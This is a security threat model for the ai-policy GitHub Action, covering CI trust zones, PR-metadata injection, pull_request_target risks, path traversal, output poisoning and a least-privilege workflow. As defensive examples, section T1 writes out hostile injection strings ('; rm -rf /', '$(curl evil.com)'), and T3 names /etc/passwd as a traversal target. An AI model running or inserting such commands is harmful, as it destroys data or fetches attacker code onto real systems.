# Threat Model: ai-policy GitHub Action & CI Integration

## 1. Executive Summary

`ai-policy-kit` provides continuous integration tooling and a GitHub Action (`ai-policy`) to validate pull request compliance against machine-readable AI contribution policies (`ai-policy.yml`). Because CI workflows execute in environments with access to repository secrets and API tokens, any tool processing untrusted input from pull requests must adhere to rigorous defensive engineering practices.

This document establishes the security boundaries, threat vectors, mitigation strategies, and recommended least-privilege configurations for maintainers integrating `ai-policy` into their automated pipelines.

---

## 2. System Architecture & Trust Boundaries

```
[ Contributor Fork ] 
         │ (Submits PR: code, title, body, commit trailers, branch name)
         ▼
[ GitHub Actions Runner ]
   ├── Event Payload (UNTRUSTED DATA)
   │     ├── github.event.pull_request.title
   │     ├── github.event.pull_request.body
   │     ├── github.event.pull_request.head.ref
   │     └── git commit history & diff
   │
   ├── ai-policy Action (SANDBOXED RUNTIME)
   │     ├── Node.js 20 ESM Execution
   │     ├── Least-Privilege GITHUB_TOKEN (read-only)
   │     ├── Policy Parser (Schema Draft-07 validation)
   │     └── Output Sink (GITHUB_OUTPUT, GITHUB_STEP_SUMMARY)
   │
   └── Security Boundary: No network exfiltration, no arbitrary code execution
```

### Trust Zones:
1. **Untrusted Zone**: Pull request metadata (title, body, branch name, author, commit messages, diff contents) supplied by external contributors.
2. **Execution Zone**: The GitHub Actions runner virtual machine.
3. **Protected Zone**: The upstream repository source code, release artifacts, package registry credentials, and maintainer tokens.

---

## 3. Threat Classification & Vectors

### T1. Command & Script Injection via PR Metadata
* **Threat**: Malicious contributors may craft pull request titles, branch names, commit messages, or body descriptions containing shell metacharacters (e.g., `; rm -rf /`, `$(curl evil.com)`, `` `id` ``).
* **Impact**: Remote code execution (RCE) on the runner if metadata is interpolated directly into shell script steps (`run:`).
* **Mitigation**:
  - `ai-policy` executes as a compiled Node.js application (`using: node20`), bypassing bash/sh shell evaluation entirely.
  - Arguments are passed through Node.js `execFile`/`execFileSync` arrays, never through shell string concatenations or `eval()`.
  - In workflow examples, maintainers are instructed to pass parameters via environment variables (`env:`) rather than inline `${{ github.event... }}` template expressions.

### T2. Pwn Request & Token Privilege Escalation (`pull_request_target`)
* **Threat**: Using `pull_request_target` with elevated write permissions or repository secrets, combined with checking out untrusted code from the fork.
* **Impact**: Exfiltration of `GITHUB_TOKEN` with write access, compromise of repository branch protection, or unauthorized package publishing.
* **Mitigation**:
  - **Rule**: `ai-policy` requires only read access (`contents: read`, `pull-requests: read`).
  - **Rule**: Workflows should use the standard `pull_request` event for all automated checks.
  - **Rule**: If `pull_request_target` is strictly needed (e.g., for automated PR commenting from forks), the workflow MUST NOT checkout the untrusted fork code into the runner without isolating permissions. `ai-policy lint-pr` evaluates git metadata without running contributor build scripts.

### T3. Malicious Configuration Overwrite / Path Traversal
* **Threat**: A PR might attempt to point `--config` or `policy-path` to an arbitrary filesystem path (e.g., `/etc/passwd`, Windows registry roots) or manipulate policy rules to bypass checks.
* **Impact**: File disclosure or policy evasion.
* **Mitigation**:
  - Policy file discovery restricts resolution to canonical paths within the repository root (`.github/ai-policy.yml`, `ai-policy.yml`).
  - Loaded policies must strictly conform to JSON Schema Draft-07 (`additionalProperties: false`), rejecting unauthorized rule injections or corrupted fields.

### T4. Output Delimiter Collision & Workflow Output Poisoning
* **Threat**: A PR body or commit message could contain strings like `passed=true`, `delimiter<<EOF`, or `::set-output` intended to alter downstream step logic.
* **Impact**: Downstream workflow steps might incorrectly assume validation passed.
* **Mitigation**:
  - `ai-policy` uses strict integer exit codes (`0` = pass, `1` = policy violation / leak, `2` = syntax / schema error).
  - Workflow failures are triggered directly via `core.setFailed()` / `process.exitCode = 1`, ensuring the job terminates before downstream steps execute.
  - Multi-line outputs and summary tables are properly escaped and truncated.

### T5. Denial of Service via Massive Diffs or Step Summaries
* **Threat**: A PR containing thousands of commits or gigabytes of diff text could exhaust runner memory or exceed GitHub's 1MB `GITHUB_STEP_SUMMARY` limit.
* **Impact**: Action crash, unhandled exceptions, or corrupted job summaries.
* **Mitigation**:
  - Git commit inspection is bounded to the specified merge base range (`baseRef...headRef`).
  - Step Summary generation enforces graceful truncation within 1,024 KB.
  - Stream processing of git diffs prevents full-file buffering in memory.

### T6. Data Privacy & Exfiltration
* **Threat**: Automated tools might inadvertently transmit proprietary code or contributor prompts to external telemetry or third-party LLM APIs.
* **Impact**: Confidentiality breach of private repository code.
* **Mitigation**:
  - `ai-policy-kit` is **100% hermetic and deterministic**.
  - It contains zero telemetry, zero analytics, and makes zero network calls to external LLM services. All parsing and validation execute locally within the runner process.

---

## 4. Least-Privilege Workflow Specification

Maintainers should configure workflows with explicit, minimal permissions at the job or workflow level:

```yaml
name: AI Policy Compliance

on:
  pull_request:
    branches: [ main, master ]

# Restrict default permissions to read-only across all jobs
permissions:
  contents: read
  pull-requests: read

jobs:
  validate:
    name: Verify AI Contribution Policy
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          # Fetch full history for PR commit trailer inspection
          fetch-depth: 0

      - name: Run AI Policy Validation
        uses: thanhtrieunguyen/ai-policy-kit@v0.1.0
        with:
          policy-path: '.github/ai-policy.yml'
          base-ref: ${{ github.base_ref }}
          head-ref: ${{ github.head_ref }}
          pr-body: ${{ github.event.pull_request.body }}
          fail-on-leak: 'true'
```

---

## 5. Security Checklist for Maintainers

| Checklist Item | Requirement | Status / Recommendation |
| :--- | :--- | :--- |
| **Workflow Event** | Use `pull_request` by default | Enforced in all standard examples |
| **Token Permissions** | `contents: read`, `pull-requests: read` | Never grant `write-all` |
| **Action Reference** | Pin action to immutable release tag or SHA | e.g. `uses: thanhtrieunguyen/ai-policy-kit@<commit-sha>` |
| **Fork PR Handling** | Do NOT use `pull_request_target` with code checkout | Documented and cautioned |
| **Shell Interpolation** | Avoid `run: ... ${{ github.event... }}` | Use Action inputs or environment variables |
| **Offline Execution** | Zero third-party API dependencies | Fully hermetic execution verified |

---

*ai-policy is a deterministic policy compliance validator, NOT an AI text/code detector.*
